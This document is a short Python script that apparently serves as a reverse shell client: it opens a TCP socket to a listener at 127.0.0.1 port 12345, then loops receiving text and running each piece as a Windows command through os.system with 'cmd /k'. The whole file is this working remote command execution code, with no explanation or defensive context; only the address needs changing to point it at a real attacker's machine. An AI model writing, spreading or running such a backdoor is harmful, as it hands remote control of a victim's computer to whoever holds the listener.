import socket
import os

host = '127.0.0.1'
port = 12345

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

print("[ SUCCESS ] Connection establish")
s.connect((host, port))

while True:
    data = s.recv(1024)
    print("[ OK ] Command executed")
    os.system('cmd /k' + data.decode())